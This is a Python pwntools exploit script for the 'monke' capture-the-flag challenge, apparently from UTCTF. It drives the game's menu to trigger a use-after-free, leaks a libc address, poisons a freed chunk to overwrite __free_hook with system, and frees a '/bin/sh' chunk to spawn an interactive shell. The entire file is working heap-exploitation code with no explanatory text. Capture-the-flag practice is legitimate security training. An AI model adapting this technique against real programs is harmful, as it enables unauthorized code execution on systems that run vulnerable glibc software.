#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn.utctf.live', 9999
binary = './monke'
brkpts = '''
'''

elf = ELF("monke")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a, drop = True)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary)

def menu(idx):
    sla("What would you like to do?\n", str(idx))

def walk(path):
    menu(0)
    sla("[n|s|e|w]\n", str(path))
    if "You are in an empty field." in rl():
        return False
    else:
        return True

def inventory(idx, action):
    menu(2)
    sla("Pick an item.\n", str(idx))
    sla("[eat|rename]:\n", str(action))

def take_banana(size, name):
    menu(3)
    sla("name to be:\n", str(size))
    sla("name it:\n", str(name))

if __name__ == "__main__":
    gdb.attach(io)
    tmp = False
    while tmp is False:
        tmp = walk('n')
    take_banana(0x500, "a")
    take_banana(0x500, "b")
    take_banana(0x20, "c")
    take_banana(0x20, "d")
    take_banana(0x20, "/bin/sh\x00")
    walk('a')
    inventory(0, 'eat')
    inventory(1, 'eat')
    menu('2')
    reu('0: \xa0')
    libc.address = u64(("\xa0" + reu('1: ')).ljust(8,"\x00")) - 0x3ebca0
    log,info("Libc : " + hex(libc.address))
    system = libc.symbols['system']
    free_hook = libc.symbols['__free_hook']
    sl('2')
    sla("[eat|rename]:\n", 'eat')
    inventory(3, 'eat')
    inventory(3, 'rename')
    sla('name it:\n', p64(free_hook))
    sla("[n|s|e|w]\n", 'n')
    tmp = False
    while tmp is False:
        tmp = walk('n')
    take_banana(0x20, "c")
    take_banana(0x20, p64(system))
    sla("[n|s|e|w]\n", 'n')
    inventory(4, 'eat')
    io.interactive()
